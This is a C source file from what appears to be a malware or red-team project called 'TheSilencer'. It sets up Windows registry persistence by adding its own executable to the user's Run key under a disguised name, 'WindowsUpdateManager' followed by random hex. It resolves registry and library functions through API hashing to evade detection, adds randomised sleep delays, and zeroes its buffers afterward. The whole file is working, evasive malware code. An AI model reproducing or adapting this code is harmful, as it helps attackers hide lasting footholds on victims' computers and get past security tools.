// "@Yenn.exe | TheSilencer Project 
// API hashing, dynamic key generation, and entropy-based timing functions

#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "Debug.h"

// Function type definitions
typedef LSTATUS (WINAPI* fnRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LSTATUS (WINAPI* fnRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS (WINAPI* fnRegCloseKey)(HKEY);
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);

// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Entropy-based timing function
// GetTickCount is the system uptime in milliseconds 
// GetCurrentProcessId returns the process ID of the calling process
// entropy is generated by XORing (^ Exclusive OR) these two values which is a bitwise operation that combines the bits of both values and produces a new value that is less predictable.
// Sleep is used to pause the execution for a random duration between 50 and 550 milliseconds
// also getting the remainder of the division of entropy by 500, which will give a value between 0 and 499, then adding 50 to it, resulting in a sleep time between 50 and 550 milliseconds
VOID XmJitterSleep(VOID) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
	Sleep(50 + (entropy % 500)); 
}
// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Dynamic key path generation with improved obfuscation
VOID XmGenerateSubKey(PWCHAR Buffer, SIZE_T Size) {
    // Instead of random locations, we'll use Run key but with obfuscated value name
    const WCHAR* basePath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    SIZE_T baseLen = 0;
    
    // Copy base path
    while(baseLen < Size - 1 && basePath[baseLen]) {
        Buffer[baseLen] = basePath[baseLen];
        baseLen++;
    }
    Buffer[baseLen] = L'\0';
}
// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Helper functions for UI presentation
VOID XmPrintProgress(const WCHAR* status, int progress) {
#ifdef DEBUG
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    PRINT("\r[");
    for (int i = 0; i < 25; i++) {
        if (i < progress / 4) {
            PRINT("==");
        }
        else {
            PRINT("  ");
        }
    }
    PRINT("] %d%% | %ws", progress, status);
    FlushFileBuffers(hConsole);  // Use Windows API instead of fflush
#endif
}

VOID XmPrintHeader() {
#ifdef DEBUG
    PRINT("\n==========================================================\n");
    PRINT("             TheSilencer Persistence Setup                  \n");
    PRINT("==========================================================\n\n");
#endif
}

// Function to set persistence in the registry
BOOL XmSetPersistence(VOID) {
#ifdef DEBUG
    XmPrintHeader();
    XmPrintProgress(L"Initializing persistence setup...", 0);
#endif

    WCHAR wszPath[MAX_PATH] = { 0 };
    WCHAR wszKeyPath[MAX_PATH] = { 0 };
    HKEY hKey = NULL;
    BOOL bSuccess = FALSE;

    // Get current module path
    if (GetModuleFileNameW(NULL, wszPath, MAX_PATH) == 0) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get module path. Error: %d\n", GetLastError());
#endif
        return FALSE;
    }

    XmPrintProgress(L"Loading required modules...", 20);
    XmJitterSleep();

    // First load advapi32.dll using LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH);
    if (!hKernel32) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get kernel32.dll handle\n");
#endif
        return FALSE;
    }

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, DLL_LOAD_HASH);
    if (!pLoadLibraryA) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get LoadLibraryA\n");
#endif
        return FALSE;
    }

    XmPrintProgress(L"Loading advapi32.dll...", 40);
    pLoadLibraryA("advapi32.dll");

    HMODULE hAdvapi = GetModuleHandleH(advapi32dll_DJB2);
    if (!hAdvapi) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get advapi32.dll handle\n");
#endif
        return FALSE;
    }

    XmPrintProgress(L"Resolving registry functions...", 60);

    fnRegCreateKeyExW pRegCreateKeyExW = (fnRegCreateKeyExW)GetProcAddressH(hAdvapi, REG_CREATE_HASH);
    if (!pRegCreateKeyExW) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get RegCreateKeyExW\n");
#endif
        return FALSE;
    }

    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(hAdvapi, REG_SET_VALUE_HASH);
    if (!pRegSetValueExW) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get RegSetValueExW\n");
#endif
        return FALSE;
    }

    fnRegCloseKey pCloseKey = (fnRegCloseKey)GetProcAddressH(hAdvapi, REG_CLOSE_KEY_HASH);
    if (!pCloseKey) {
#ifdef DEBUG
        PRINT("\n[-] Failed to get RegCloseKey\n");
#endif
        return FALSE;
    }

    XmPrintProgress(L"Setting up registry persistence...", 80);

    XmGenerateSubKey(wszKeyPath, MAX_PATH);
    
    WCHAR wszValueName[32] = { 0 };
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    wsprintfW(wszValueName, L"WindowsUpdateManager%x", (entropy & 0xFFFF));

    DWORD dwError = 0;
    if (pRegCreateKeyExW(HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        XmJitterSleep();
        XmPrintProgress(L"Finalizing persistence...", 90);

        DWORD cbData = (DWORD)((wcslen(wszPath) + 1) * sizeof(WCHAR));
        if (pRegSetValueExW(hKey, wszValueName, 0, REG_SZ,
            (BYTE*)wszPath, cbData) == ERROR_SUCCESS) {
            bSuccess = TRUE;
        }
        else {
            dwError = GetLastError();
#ifdef DEBUG
            PRINT("\n[-] Failed to set value. Error: %d\n", dwError);
#endif
        }

        if (hKey) {
            pCloseKey(hKey);
            hKey = NULL;
        }
    }
    else {
        dwError = GetLastError();
#ifdef DEBUG
        PRINT("\n[-] Failed to create key. Error: %d\n", dwError);
#endif
    }

    if(bSuccess) {
        XmPrintProgress(L"Persistence successfully established!", 100);
        PRINT("\n\n");
        
        // Add longer jitter sleep after completion
        DWORD finalEntropy = GetTickCount() ^ GetCurrentProcessId();
        Sleep(2000 + (finalEntropy % 1000)); // Sleep between 2-3 seconds
    }

    // Cleanup sensitive data
    RtlSecureZeroMemory(wszKeyPath, sizeof(wszKeyPath));
    RtlSecureZeroMemory(wszValueName, sizeof(wszValueName));
    RtlSecureZeroMemory(wszPath, sizeof(wszPath));

    return bSuccess;
}

